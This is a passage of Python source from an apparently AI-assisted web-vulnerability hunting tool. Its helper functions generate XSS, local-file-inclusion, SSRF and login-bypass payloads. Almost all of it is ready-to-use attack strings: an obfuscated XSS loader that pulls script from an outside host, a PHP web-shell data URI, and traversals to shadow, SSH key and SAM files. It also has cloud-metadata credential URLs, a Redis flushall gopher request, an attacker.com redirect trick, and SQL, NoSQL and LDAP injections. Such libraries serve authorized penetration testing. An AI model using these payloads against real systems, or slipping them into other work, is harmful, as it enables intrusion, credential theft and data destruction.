        '<svg onload="alert(1)">',
        "<svg onload='alert(1)'>",
        '<svg><animate onbegin=alert(1)>',
        '<svg><set onbegin=alert(1)>',
        '<svg><script>alert(1)</script>',
        '<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVtb3RlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIj4KPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo8L3N2Zz4=#remote"/>',
        '<svg><a xlink:href="javascript:alert(1)"><text y="20">XSS</text></a></svg>',
    ]


def _xss_js_uri_variants() -> List[str]:
    """JavaScript URI variants"""
    return [
        'javascript:alert(1)',
        'javascript:alert`1`',
        'JaVaScRiPt:alert(1)',
        'JAVASCRIPT:alert(1)',
        'javascript&#58;alert(1)',
        'javascript&#x3A;alert(1)',
        'j&#97;v&#97;script&#58;alert(1)',
        'j\tavasc\triptr\t:alert(1)',
        '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)',
        'java\0script:alert(1)',
        'javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>',
    ]


def _xss_null_byte(payload: str) -> str:
    """Insert null byte inside script tag to confuse parsers"""
    if "<script>" in payload.lower():
        return payload.lower().replace("<script>", "<scri\x00pt>")
    return payload.replace("<", "<\x00")


def _xss_html_entity(payload: str) -> str:
    """HTML entity encode angle brackets"""
    return payload.replace("<", "&#60;").replace(">", "&#62;")


def _xss_unicode_escape(payload: str) -> str:
    """Unicode escape JS identifiers (alert → \\u0061\\u006c\\u0065\\u0072\\u0074)"""
    if "alert" in payload.lower():
        unicode_alert = "\\u0061\\u006c\\u0065\\u0072\\u0074"
        return re.sub(r'\balert\b', lambda m: unicode_alert, payload, flags=re.IGNORECASE)
    return payload


def _xss_event_handlers() -> List[str]:
    """Comprehensive event handler XSS payloads"""
    return [
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert`1`>',
        '<body onload=alert(1)>',
        '<body onerror=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg onresize=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<input onblur=alert(1) autofocus><input autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video src=1 onerror=alert(1)>',
        '<audio src=1 onerror=alert(1)>',
        '<div onmouseenter=alert(1)>hover me</div>',
    ]


def _xss_css_expression() -> List[str]:
    """CSS expression injection (old IE)"""
    return [
        '<style>body{background-image:url("javascript:alert(1)")}</style>',
        '<style>*{x:expression(alert(1))}</style>',
        '<div style="background-image:url(javascript:alert(1))">',
    ]


def _xss_iframe_srcdoc() -> List[str]:
    """Iframe srcdoc XSS"""
    b64 = base64.b64encode(b'<script>alert(1)</script>').decode()
    return [
        "<iframe srcdoc='<script>alert(1)</script>'>",
        '<iframe src="javascript:alert(1)">',
        f'<iframe src="data:text/html;base64,{b64}">',
        '<iframe onload=alert(1)>',
    ]


def _xss_polyglots() -> List[str]:
    """Universal XSS polyglots that work in multiple contexts"""
    return [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "'\"--></style></script><svg onload=alert(1)>",
        "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>",
        '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJvY2tzL3hzcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>',
    ]


# ═══════════════════════════════════════════════════════════════════════════════
# ── Helper Functions — LFI ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _lfi_double_dot_variants(payload: str) -> List[MutationResult]:
    """Generate double-dot path traversal variants"""
    base_traversals = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "....\/....\/....\/etc/passwd",
        "....\\....\\....\\etc\\passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%5C..%5C..%5Cetc%5Cpasswd",
        ".%2e/.%2e/.%2e/etc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..././..././..././etc/passwd",
        ".../.../.../.../etc/passwd",
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    ]

    results = []
    for t in base_traversals:
        results.append(MutationResult(t, "double_dot", "lfi", 2))

    return results


def _lfi_url_encode(payload: str, single=False, double=False, triple=False) -> str:
    """URL encode path separators and dots"""
    result = payload
    if single:
        result = result.replace("../", "%2e%2e%2f").replace("..", "%2e%2e").replace("/", "%2f")
    elif double:
        result = result.replace("../", "%252e%252e%252f").replace("..", "%252e%252e")
    elif triple:
        result = result.replace("../", "%25252e%25252e%25252f")
    return result


def _lfi_php_wrappers(payload: str, os_type: str) -> List[str]:
    """PHP wrapper-based LFI payloads"""
    wrappers = [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
        "php://filter/convert.iconv.UTF-8.UTF-16LE/resource=index.php",
        "php://input",
        "php://stdin",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "data://text/plain,<?php system($_GET['cmd']);?>",
        "expect://id",
        "phar://./test.phar/test.txt",
        "zip://shell.jpg#shell.php",
        "glob://etc/p*sswd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ]

    if os_type == "windows":
        wrappers.extend([
            "php://filter/convert.base64-encode/resource=C:\\windows\\system32\\drivers\\etc\\hosts",
            "file:///C:\\windows\\system32\\drivers\\etc\\hosts",
        ])

    return wrappers


def _lfi_absolute_paths(os_type: str) -> List[str]:
    """Absolute path traversal payloads"""
    if os_type == "linux":
        return [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/os-release",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/version",
            "/proc/net/tcp",
            "/var/log/apache2/access.log",
            "/var/log/apache/access.log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/var/www/html/index.php",
            "/home/www/.bash_history",
            "/root/.bash_history",
            "/root/.ssh/id_rsa",
        ]
    else:
        return [
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\win.ini",
            "C:\\boot.ini",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\windows\\system32\\config\\SAM",
            "C:\\windows\\repair\\SAM",
            "C:\\windows\\system32\\config\\SYSTEM",
            "C:\\users\\administrator\\desktop\\desktop.ini",
        ]


def _lfi_utf8_overlong(payload: str) -> str:
    """UTF-8 overlong encoding: . → %c0%2e, / → %c0%af"""
    result = payload
    result = result.replace("../", "%c0%ae%c0%ae%c0%af")
    result = result.replace("..", "%c0%ae%c0%ae")
    result = result.replace("/", "%c0%af")
    return result


def _lfi_mixed_slash(payload: str) -> str:
    """Mix forward and backslashes"""
    result = ""
    for i, c in enumerate(payload):
        if c == "/":
            result += "\\" if i % 2 == 0 else "/"
        else:
            result += c
    return result


def _lfi_wrapper_chain() -> List[str]:
    """PHP filter wrapper chains for advanced bypasses"""
    return [
        "php://filter/zlib.deflate|convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.iconv.utf-8.utf-16be/resource=/etc/passwd",
        "php://filter/convert.iconv.UTF-8.UTF-16/convert.iconv.UTF-16.ISO-8859-7/resource=/etc/passwd",
        "php://filter/string.strip_tags/resource=php://input",
    ]


def _lfi_path_normalization(payload: str) -> str:
    """Path normalization confusion: /./././etc/passwd"""
    parts = payload.split("/")
    confused = []
    for p in parts:
        if p == "..":
            confused.extend([".", ".", "..", ""])  # ./././..
        else:
            confused.append(p)
    return "/".join(confused)


def _lfi_strip_extension(payload: str) -> List[str]:
    """Bypass extension appending: if app does file + ".php" """
    return [
        payload + "%00",          # null byte (PHP < 5.3)
        payload + "%00.jpg",
        payload + "?.jpg",
        payload + "#.jpg",
        payload + " ",
        payload.rstrip("/") + "/.",
    ]


# ═══════════════════════════════════════════════════════════════════════════════
# ── Helper Functions — SSRF ───────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _ssrf_mutate_url_payload(payload: str) -> List[Tuple[str, str, int]]:
    """Mutate user's URL by replacing host with decimal/octal/hex/IPv6. Returns [(url, technique, priority), ...]."""
    out: List[Tuple[str, str, int]] = []
    if not payload or not payload.strip().lower().startswith(("http://", "https://")):
        return out
    try:
        parsed = urlparse(payload.strip())
        if parsed.scheme not in ("http", "https") or not parsed.netloc:
            return out

        host = (parsed.hostname or "").lower()
        if not host:
            return out

        userinfo = ""
        if parsed.username is not None:
            userinfo = parsed.username
            if parsed.password is not None:
                userinfo += f":{parsed.password}"
            userinfo += "@"

        port_part = f":{parsed.port}" if parsed.port else ""

        def _build_url(mutated_host: str) -> str:
            # Keep IPv6 hosts bracketed in netloc.
            if ":" in mutated_host and not mutated_host.startswith("["):
                host_part = f"[{mutated_host}]"
            else:
                host_part = mutated_host
            netloc = f"{userinfo}{host_part}{port_part}"
            return urlunparse((
                parsed.scheme,
                netloc,
                parsed.path or "/",
                parsed.params,
                parsed.query,
                parsed.fragment,
            ))

        # 127.0.0.1 / localhost
        if host in ("127.0.0.1", "localhost", "127.0.0.0.1", "::1"):
            out.append((_build_url("2130706433"), "decimal_ip_payload", 1))
            out.append((_build_url("0x7f000001"), "hex_ip_payload", 2))
            out.append((_build_url("0177.0.0.1"), "octal_ip_payload", 2))
            out.append((_build_url("::1"), "ipv6_payload", 1))
            out.append((_build_url("::ffff:127.0.0.1"), "ipv4_mapped_payload", 2))
        # 169.254.169.254 (metadata)
        elif host in ("169.254.169.254", "::ffff:169.254.169.254"):
            out.append((_build_url("2852039166"), "decimal_ip_payload", 1))
            out.append((_build_url("0xa9fea9fe"), "hex_ip_payload", 2))
            out.append((_build_url("::ffff:169.254.169.254"), "ipv4_mapped_payload", 2))
    except Exception:
        pass
    # Deduplicate while preserving order
    seen = set()
    uniq: List[Tuple[str, str, int]] = []
    for item in out:
        if item[0] not in seen:
            seen.add(item[0])
            uniq.append(item)
    return uniq


def _ssrf_ipv6_variants() -> List[str]:
    """IPv6 localhost bypass variants"""
    return [
        "http://[::1]",
        "http://[::1]:80",
        "http://[::1]:8080",
        "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
        "http://[0:0:0:0:0:0:0:1]",
        "http://[::ffff:127.0.0.1]",
        "http://[::ffff:7f00:1]",
        "http://[0:0:0:0:0:ffff:7f00:1]",
        "http://[::ffff:0x7f000001]",
        "http://[v1.test]",
    ]


def _ssrf_decimal_ip_variants() -> List[str]:
    """Decimal IP encoding: 127.0.0.1 → 2130706433"""
    return [
        "http://2130706433",          # 127.0.0.1
        "http://2130706433:80",
        "http://2130706433/",
        "http://0x7f000001",          # hex form
        "http://2130706433/latest/meta-data/",   # AWS metadata via decimal
        "http://2852039166",          # 169.254.169.254 in decimal
        "http://2852039166/latest/meta-data/",
        "http://0xa9fea9fe",          # 169.254.169.254 hex
    ]


def _ssrf_octal_ip_variants() -> List[str]:
    """Octal IP encoding"""
    return [
        "http://0177.0.0.1",          # 127.0.0.1 first octet
        "http://0177.0.0.1:80",
        "http://0177.00.00.01",
        "http://0251.0376.0251.0376",  # 169.254.169.254 octal
        "http://0251.0376.0251.0376/latest/meta-data/",
        "http://0.0.0.0",
    ]


def _ssrf_hex_ip_variants() -> List[str]:
    """Hex IP encoding"""
    return [
        "http://0x7f000001",
        "http://0x7f000001:80",
        "http://0xa9fea9fe",          # 169.254.169.254
        "http://0xa9fea9fe/latest/meta-data/",
        "http://0x7f.0x00.0x00.0x01",
    ]


def _ssrf_cloud_metadata() -> List[str]:
    """Cloud provider metadata endpoints"""
    return [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/meta-data/hostname",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/computeMetadata/v1/",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1.json",
        # Oracle Cloud
        "http://169.254.169.254/opc/v1/instance/",
        # Kubernetes
        "http://kubernetes.default.svc/api/v1/namespaces",
        "http://10.96.0.1/api/v1/",
    ]


def _ssrf_dns_rebind() -> List[str]:
    """DNS rebinding / CNAME tricks to bypass allowlists"""
    return [
        "http://localtest.me",               # resolves to 127.0.0.1
        "http://127.0.0.1.nip.io",           # nip.io wildcard DNS
        "http://127.0.0.1.xip.io",
        "http://spoofed.burpcollaborator.net", # OOB DNS
        "http://0.0.0.0",
        "http://localhost.localdomain",
        "http://localhost6",
        "http://ip6-localhost",
        "http://::1",
    ]


def _ssrf_protocol_smuggling() -> List[str]:
    """Protocol smuggling variants"""
    return [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",  # Redis
        "gopher://127.0.0.1:3306/",
        "gopher://127.0.0.1:11211/",  # Memcached
        "dict://127.0.0.1:11211/",
        "ldap://127.0.0.1:389/%0astats",
        "sftp://127.0.0.1:22",
        "tftp://127.0.0.1:69/TESTUDPPACKET",
        "ftp://127.0.0.1:21",
        "http://127.0.0.1:2375/v1.24/info",  # Docker API
        "http://127.0.0.1:10255/pods",         # Kubelet
        "http://127.0.0.1:4040",               # Spark UI
    ]


def _ssrf_loopback_variants() -> List[str]:
    """Loopback address variants"""
    return [
        "http://127.1",
        "http://127.0.1",
        "http://127.0.0.1",
        "http://127.000.000.001",
        "http://0",
        "http://0.0.0.0",
        "http://localhost",
        "http://LOCALHOST",
        "http://loCalHost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",  # Redis
        "http://127.0.0.1:5432",  # PostgreSQL
        "http://127.0.0.1:27017", # MongoDB
    ]


def _ssrf_ipv4_mapped() -> List[str]:
    """IPv4-mapped IPv6 addresses"""
    return [
        "http://[::ffff:127.0.0.1]",
        "http://[::ffff:169.254.169.254]",
        "http://[::ffff:7f00:1]",
        "http://[::ffff:a9fe:a9fe]",   # 169.254.169.254 hex
    ]


def _ssrf_at_sign_bypass(payload: str) -> List[str]:
    """URL authority confusion with @ sign"""
    if not payload or not payload.strip().lower().startswith(("http://", "https://")):
        return []
    try:
        parsed = urlparse(payload.strip())
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            return []

        decoy = parsed.hostname
        if parsed.port:
            decoy = f"{decoy}:{parsed.port}"
        tail = urlunparse(("", "", parsed.path or "/", parsed.params, parsed.query, parsed.fragment))

        variants = [
            f"{parsed.scheme}://{decoy}@127.0.0.1{tail}",
            f"{parsed.scheme}://{decoy}@127.0.0.1:80{tail}",
            f"{parsed.scheme}://{decoy}@169.254.169.254{tail}",
            f"{parsed.scheme}://{decoy}@169.254.169.254/latest/meta-data/",
        ]
        return list(dict.fromkeys(variants))
    except Exception:
        return []


def _ssrf_scheme_case(payload: str) -> List[str]:
    """Case mutations on URL scheme"""
    return [
        payload.replace("http://", "HTTP://"),
        payload.replace("http://", "Http://"),
        payload.replace("https://", "HTTPS://"),
    ]


def _ssrf_redirect_bypass(payload: str) -> List[str]:
    """Open redirect chaining for SSRF"""
    if not payload or not payload.strip().lower().startswith(("http://", "https://")):
        return []
    try:
        parsed = urlparse(payload.strip())
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            return []

        allowlisted_hint = parsed.hostname
        internal_target = "http://169.254.169.254/latest/meta-data/"
        encoded_target = quote(internal_target, safe="")
        base_tail = urlunparse(("", "", parsed.path or "/", parsed.params, parsed.query, parsed.fragment))

        variants = [
            f"{parsed.scheme}://{allowlisted_hint}.attacker.com{base_tail}",
            f"{parsed.scheme}://{allowlisted_hint}/?url={encoded_target}",
            f"{parsed.scheme}://{allowlisted_hint}/redirect?next={encoded_target}",
            f"{parsed.scheme}://169.254.169.254.{allowlisted_hint}/latest/meta-data/",
            f"{parsed.scheme}://169.254.169.254%0a@{allowlisted_hint}/",
            f"{parsed.scheme}://169.254.169.254%09@{allowlisted_hint}/",
        ]
        return list(dict.fromkeys(variants))
    except Exception:
        return []


# ═══════════════════════════════════════════════════════════════════════════════
# ── Helper Functions — Auth ───────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _auth_sqli_no_quote() -> List[str]:
    """SQL injection bypass without quotes"""
    return [
        "admin'--",
        "admin' --",
        "admin'#",
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR 1=1#",
        "admin'/*",
        "' OR 1=1/*",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "1' OR '1'='1",
        "1' OR '1'='1'--",
        "' OR 1=1 LIMIT 1--",
        "' OR sleep(5)--",
        "a' OR 1=1--",
        "a' OR 'a'='a",
        "' OR 'x'='x",
    ]


def _auth_sqli_hex() -> List[str]:
    """SQLi bypass with hex encoding to avoid quote filters"""
    return [
        "' OR 0x313d31--",              # '1'='1' hex encoded
        "admin 0x61646d696e--",          # admin hex
        "' OR hex(1)=hex(1)--",
        "' OR char(49)=char(49)--",
        "' OR 1=1 AND 0x61=0x61--",
        "1' AND ASCII(SUBSTRING(username,1,1))>64--",  # blind extraction hint
    ]


def _auth_nosql_operators() -> List[str]:
    """NoSQL operator injection (MongoDB, CouchDB)"""
    return [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$ne": "invalid"}',
        '{"$gt": "", "$lt": "z"}',
        '{"$regex": ".*"}',
        '{"$regex": "^admin"}',
        '{"$where": "1==1"}',
        '{"$exists": true}',
        '{"$in": ["admin", "user", "root"]}',
        # URL param style
        "[$ne]=1",
        "[$gt]=",
        "[$regex]=.*",
        '[$where]=1==1',
        # JSON body injection
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"username": "admin", "password": {"$gt": ""}}',
    ]


def _auth_ldap_injection() -> List[str]:
    """LDAP injection payloads"""
    return [
        "*",
        "*)(&",
        "*)(uid=*)(|(uid=*",
        "admin)(&(password=*))",
        "*))%00",
        "admin*",
        "*)(&(objectClass=*)",
        "*()|&'",
        "*(|(mail=*))",
        "*(|(objectclass=*))",
        "*(admin)(&(admin=*))",
        "admin)(|(password=admin",
    ]


def _auth_type_juggling() -> List[str]:
    """PHP type juggling and loose comparison bypass"""
    return [
        "true",
        "false",
        "1",
        "0",
        "null",
        "[]",
        "{}",
        "0e123",              # 0e... == 0 in PHP loose comparison
        "0e0",
        "240610708",          # MD5 starts with 0e
        "QNKCDZO",           # MD5 starts with 0e
        "aabg74080463",
        "0",
        "",
        "admin\x00injected",
    ]


def _auth_parameter_pollution(payload: str) -> List[str]:
    """HTTP parameter pollution variants"""
    return [
        f"{payload}&username=admin",
        f"admin&username={payload}",
        f"username=admin%00&username={payload}",
    ]


def _auth_username_from_payload(payload: str) -> str:
    """Extract username from payload for case/unicode mutations. Fallback 'admin'."""
    if not payload or not payload.strip():
        return "admin"
    # username:password or username=... or plain username
    p = payload.strip()
    for sep in (":", "=", "|", "\t"):
        if sep in p:
            part = p.split(sep)[0].strip()
            if part and len(part) < 64 and part.isprintable():
                return part
    # single word, use as username if reasonable
    if p.isprintable() and len(p) < 64 and not any(c in p for c in ("'", '"', "--", " OR ")):
        return p
    return "admin"


def _auth_case_variations(word: str) -> List[str]:
    """Generate case variations"""
    return [
        word.upper(),
        word.capitalize(),
        "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(word)),
        "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(word)),
        word.lower(),
        word.title(),
    ]


def _auth_unicode_bypass(word: str) -> List[str]:
    """Unicode lookalike / full-width bypass for any username word."""
    # Full-width Unicode characters (U+FF00 range)
    full_width = "".join(chr(ord(c) + 0xFEE0) if 'a' <= c <= 'z' or 'A' <= c <= 'Z' else c for c in word)
    # Unicode escape for whole word
    u_escape = "".join(f"\\u{ord(c):04x}" for c in word) if word else ""
    # Homoglyph substitutions (first-char): a->а (Cyrillic), a->ā, i->ı (dotless)
    homoglyphs = []
    if len(word) >= 1:
        c0 = word[0].lower()
        if c0 == 'a':
            homoglyphs.append("\u0430" + word[1:])   # Cyrillic 'а'
            homoglyphs.append("\u0101" + word[1:])   # ā
        if 'i' in word.lower():
            homoglyphs.append(word.replace("i", "\u0131").replace("I", "\u0131"))  # dotless i
    result = [full_width, word + "\u200b"]  # zero-width space
    if u_escape:
        result.append(u_escape)
    result.extend(homoglyphs)
    return result


def _auth_jwt_hints() -> List[str]:
    """JWT vulnerability hint payloads (alg:none, HS/RS confusion)"""
    # These are structural hints for the AI; actual JWT manipulation
    # requires the real token which the hunter gets during testing
    none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
    return [
        f"{none_header}.eyJzdWIiOiJhZG1pbiJ9.",   # alg:none
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",  # admin subject
    ]


def _auth_comment_bypass() -> List[str]:
    """Comment-based authentication bypass"""
    return [
        "admin'--",
        "admin' --",
        "admin'#",
        "admin'/*",
        "admin' OR 1=1--",
        "' OR ''='",
        "'='",
        "admin' OR '1",
        "' OR 1--",
        "x' OR 1=1--",
        "') OR ('x'='x",
        "' OR x=x--",
        "') OR 1=1--",
        "' OR 'a'='a",
    ]
